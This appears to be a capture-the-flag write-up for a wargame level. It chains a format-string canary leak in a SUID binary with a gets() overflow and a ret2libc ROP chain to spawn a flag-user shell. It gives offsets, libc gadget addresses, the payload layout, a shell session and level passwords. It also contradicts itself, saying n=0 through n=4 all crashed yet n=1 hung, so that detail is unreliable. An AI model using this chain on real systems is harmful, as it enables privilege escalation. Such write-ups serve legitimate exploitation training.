# level06 — "3jane" — Format-String Canary Leak → `gets()` Overflow → ret2libc

## Concept

`./3jane`, SUID owned by `flag06`, home dir `/home/level06/`. First
level with a stack canary (`checksec` confirms — no canary in
level00–05). No source was provided this time (unlike level04/05), so
recon was done entirely by disassembling the live binary. The level
combines two bugs: a format-string leak (to defeat the canary) and a
classic unbounded `gets()` overflow (to actually hijack control flow).

## Recon

Login: `ssh level06@127.0.0.1 -p 4244`, password = level05's flag
(`67aaawdq0zcaaf3x57yh6irhvyjv3vs5`).

```
$ ls -la ~
-rwsr-x--- 1 flag06  level06 16808 3jane
```

No `README`, no `.c` source this time. `nm ./3jane` lists the static
functions: `init_vault`, `print_banner`, `log_request`, `authenticate`,
`display_vault`, called in that order from `main` (confirmed via
`gdb -batch -ex 'disas main'`).

`checksec --file=./3jane`: Partial RELRO, canary found, NX enabled,
no PIE. `ldd` → same libc base as every prior level (`0x7ffff7c00000`).
`getent passwd flag06` → uid 1023 (checked fresh, per the level04/05
lesson — never trust an old note's uid).

Disassembling `log_request` and `authenticate`:

- `log_request()`: `fgets(buf, 0x40, stdin)` into a buffer at `rbp-0x50`,
  strips the trailing newline, then `printf(buf)` directly — no
  format specifier, `buf` used as the format string itself. Same bug
  class as level04.
- `authenticate()`: prints a prompt, then `gets(buf)` into a buffer
  at `rbp-0x90` (144 bytes) — completely unbounded, no size check at
  all. After the read: `strncmp(buf, "STRAYLIGHT_", 11)` (the literal
  compared string, found via `x/s 0x4020ab` in gdb) — prints "Access
  granted" with a clearance value from a global `vault` struct if it
  matches, "Access denied" otherwise, then falls through to the
  canary-checked epilogue regardless of which branch fired.

Both functions have the standard `mov %fs:0x28,%rax; ...; sub
%fs:0x28,%rdx; je ok; call __stack_chk_fail` canary pattern in their
epilogues.

## Retrieving the addresses, command by command

From `sub $0x90,%rsp` and standard frame layout, the offset from
`authenticate`'s buffer to the canary is `0x90 - 0x8 = 136`. Two tests
confirm this precisely: sending a deliberately wrong 8 bytes at offset
136 triggers `*** stack smashing detected ***` (SIGABRT), while sending
the correctly leaked canary at offset 136 followed by junk gives a clean
SIGSEGV with no abort message — proof the check reads exactly that
offset and that the leaked value itself matches.

Canaries are stored per-frame but all derived from the same per-process
TLS value (`%fs:0x28`), itself seeded once at process start from
`AT_RANDOM` — leaking it from `log_request`'s frame is valid for
defeating `authenticate`'s check later in that same process run, but not
across separate process invocations. That means the exploit has to be a
genuinely interactive two-stage script against a single
`subprocess.Popen`: send the leak probe, parse the response, then build
and send the overflow payload, all in the same session — this is what
`exploit.py` does.

Probing `log_request`'s format string with `%N$p` for increasing `N` and
watching for a value whose low byte is `0x00` (the canonical canary
signature glibc uses to block naive string-based leaks) finds it
consistently at argument index 19 (e.g. `0xd407e1d43f656200`).

`getent passwd flag06` gives flag06's real uid as 1023, checked fresh
again.

The alignment-fixup `ret` count before `system()` was swept directly
against the live target rather than assumed from the level03/04/05
pattern (`n_extra_ret = 0..5`): `n=0` through `n=4` all produced
SIGSEGV, and `n=1` produced a hung process — confirmed as a spawned
shell by the harness's own attempt to `kill()` the child raising a
Python `PermissionError`, since the child had already `setreuid`'d to
`flag06` and the level06-owned script no longer had permission to
signal it.

## Why a live two-stage exploit, not a static payload

An early attempt built a static payload using a canary leaked from one
process invocation and fed it to a separately spawned invocation
(including under `gdb -batch -ex run`); this fails outright, since the
canary is randomized per process start and only remains valid for the
run it was read from. The fix is the interactive two-stage design above,
and confirming results by watching process exit signals (SIGSEGV vs
SIGABRT vs hung) rather than live gdb tracing.

## Exploit

```
authenticate() overflow, offset 136 to canary:
  136 bytes junk
  <leaked canary>          (from log_request()'s %19$p, SAME process run)
  8 bytes junk              (saved rbp, unused)
  pop rdi ; ret            (libc +0x10f78b)
  1023                     (flag06's real uid)
  pop rsi ; pop rbp ; ret  (libc +0x2b46b)
  1023
  0                        (junk, popped into rbp)
  setreuid                 (libc +0x1270d0)   <- setreuid(1023,1023) fires here
  pop rdi ; ret
  BINSH                    (libc +0x1cb42f, "/bin/sh")
  ret                      (libc +0x2882f, ONE alignment fixup — matches level03)
  system                   (libc +0x58750)
```

Two-stage interactive session (see `exploit.py`):
```
$ ./3jane
[3JANE] Request ID: %19$p            <- leak probe
[3JANE] Logging: 0xd407e1d43f656200  <- canary, parsed from this line
[3JANE] Access code: <136 bytes + canary + ROP chain>
[3JANE] Access denied.
$ id
uid=1023(flag06) gid=1009(level06) groups=1009(level06),1001(levelgroup)
$ cat /home/flag06/.pass
c1t0kg9pklac7x4c7sn7iqgfppkz4usq
```

Verified: this string works as level07's SSH password.

